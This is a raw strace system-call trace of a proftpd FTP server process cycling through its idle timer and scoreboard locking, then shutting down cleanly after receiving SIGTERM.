+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4449  [080ee5d4] _llseek(2, 0, [628], SEEK_CUR) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444954
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407444984
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407444985
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4449  [080ee5d4] _llseek(2, 0, [628], SEEK_CUR) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407444985
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407445015
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407445015
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4449  [080ee5d4] _llseek(2, 0, [628], SEEK_CUR) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407445015
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGALRM (Alarm clock) @ 0 (0) ---
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, NULL, {0x804d520, [], SA_INTERRUPT}, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGALRM, {0x804d520, [], SA_INTERRUPT}, NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407445045
+4449  [080d2e1d] alarm(30)              = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d2e1d] alarm(0)               = 30
+4449  [080cbba0] time(NULL)             = 1407445045
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb965] open("/usr/local/var/proftpd.scoreboard", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080ee5d4] _llseek(2, 16, [16], SEEK_SET) = 0
+4449  [080d3277] getpgrp()              = 4449
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eba4e] read(2, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4449  [080ee5d4] _llseek(2, 0, [628], SEEK_CUR) = 0
+4449  [080eba4e] read(2, "", 612)       = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff529a0) = 0
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407445045
+4449  [080d2e1d] alarm(30)              = 0
+4449  [080eb6d1] lstat64("/etc/shutmsg", 0xbff527e0) = -1 ENOENT (No such file or directory)
+4449  [080eca48] select(1, [0], NULL, NULL, {30, 0}) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGTERM (Terminated) @ 0 (0) ---
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000}) = 0 (Timeout)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080cbba0] time(NULL)             = 1407445050
+4449  [080eb651] stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
+4449  [080cbba0] time(NULL)             = 1407445050
+4449  [080ee80c] send(1, "<29>Aug  7 16:57:30 proftpd[4449"..., 78, 0) = 78
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec39d] unlink("/usr/local/var/proftpd.pid") = 0
+4449  [080eb965] open("/usr/local/var/proftpd.delay", O_RDWR|O_LARGEFILE) = 2
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ebb56] fcntl64(2, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=0, len=0}, 0xbff52bf8) = 0
+4449  [080ed73a] mmap2(NULL, 6440, PROT_READ|PROT_WRITE, MAP_SHARED, 2, 0) = 0xb779f000
+4449  [080ed771] munmap(0xb779f000, 6440) = 0
+4449  [080ebb56] fcntl64(2, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=0, len=0}, 0xbff52bf8) = 0
+4449  [080ebaae] write(2, "\1\0\0\000127.0.1.1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 6440) = 6440
+4449  [080eb9f7] close(2)               = 0
+4449  [080cbba0] time(NULL)             = 1407445050
+4449  [080eb651] stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
+4449  [080cbba0] time(NULL)             = 1407445050
+4449  [080ee80c] send(1, "<29>Aug  7 16:57:30 proftpd[4449"..., 91, 0) = 91
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080ec87e] setresuid32(-1, 0, -1) = 0
+4449  [080ec90e] setresgid32(-1, 0, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb651] stat64("/usr/local/var/proftpd.scoreboard", {st_mode=S_IFREG|0644, st_size=628, ...}) = 0
+4449  [080ec39d] unlink("/usr/local/var/proftpd.scoreboard") = 0
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080d314a] geteuid32()            = 0
+4449  [080ec90e] setresgid32(-1, 65534, -1) = 0
+4449  [080ec87e] setresuid32(-1, 65534, -1) = 0
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eb9f7] close(-1)              = -1 EBADF (Bad file descriptor)
+4449  [080eb9f7] close(1)               = 0
+4449  [080d30a7] exit_group(1)          = ?
